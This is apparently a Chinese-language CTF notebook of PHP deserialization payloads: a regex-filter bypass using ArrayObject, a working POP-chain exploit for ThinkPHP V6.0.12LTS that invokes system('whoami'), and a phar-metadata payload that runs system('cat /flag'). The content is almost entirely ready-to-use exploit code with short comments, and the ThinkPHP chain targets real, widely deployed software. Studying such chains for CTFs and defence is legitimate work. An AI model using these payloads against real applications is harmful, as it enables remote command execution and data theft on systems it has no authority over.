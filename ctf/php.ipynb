{
 "cells": [
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## PHP反序列换"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 绕过\"/^[Oa]:[\\d]+/i\""
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "class ctfshow{\n",
    "    public $ctfshow=\"cat /f*\";\n",
    "}\n",
    " \n",
    "$a = new ArrayObject;\n",
    "$a -> a = new ctfshow;\n",
    " \n",
    "echo serialize($a);"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### ThinkPHP V6.0.12LTS 反序列化漏洞"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "<?php\n",
    "\n",
    "// 保证命名空间的一致\n",
    "namespace think {\n",
    "    // Model需要是抽象类\n",
    "    abstract class Model {\n",
    "        // 需要用到的关键字\n",
    "        private $lazySave = false;\n",
    "        private $data = [];\n",
    "        private $exists = false;\n",
    "        protected $table;\n",
    "        private $withAttr = [];\n",
    "        protected $json = [];\n",
    "        protected $jsonAssoc = false;\n",
    "\n",
    "        // 初始化\n",
    "        public function __construct($obj='') {\n",
    "            $this->lazySave = true;\n",
    "            $this->data = ['whoami'=>['whoami']];\n",
    "            $this->exists = true;\n",
    "            $this->table = $obj;    // 触发__toString\n",
    "            $this->withAttr = ['whoami'=>['system']];\n",
    "            $this->json = ['whoami'];\n",
    "            $this->jsonAssoc = true;\n",
    "        }\n",
    "    }\n",
    "}\n",
    "\n",
    "namespace think\\model {\n",
    "    use think\\Model;\n",
    "    class Pivot extends Model {\n",
    "        \n",
    "    }\n",
    "    \n",
    "    // 实例化\n",
    "    $p = new Pivot(new Pivot());\n",
    "    echo urlencode(serialize($p));\n",
    "}\n"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### phar"
   ]
  },
  {
   "cell_type": "raw",
   "metadata": {},
   "source": [
    "file_get_contents()函数会触发phar反序列化，所以构造反序列化，绕过wakeup()函数即可\n",
    "\n",
    "<?php\n",
    "class LoveNss{\n",
    "public $ljt=\"Misc\";\n",
    "public $dky=\"Re\";\n",
    "public $cmd=\"system('cat /flag');\";\n",
    "}\n",
    "\n",
    "$test = new LoveNss();\n",
    "echo serialize($test);\n",
    "\n",
    "$phar = new Phar(\"a.phar\"); //文件名\n",
    "$phar->startBuffering();\n",
    "/* 设置stub，必须要以__HALT_COMPILER(); ?>结尾 */\n",
    "$phar->setStub(\"<?php __HALT_COMPILER(); ?>\");\n",
    "/* 设置自定义的metadata，序列化存储，解析时会被反序列化 */\n",
    "$phar->setMetaData($test);\n",
    "/* 添加要压缩的文件 */\n",
    "$phar->addFromString(\"test1.txt\",\"test1\");\n",
    "//签名自动计算\n",
    "$phar->stopBuffering();\n"
   ]
  }
 ],
 "metadata": {
  "language_info": {
   "name": "python"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
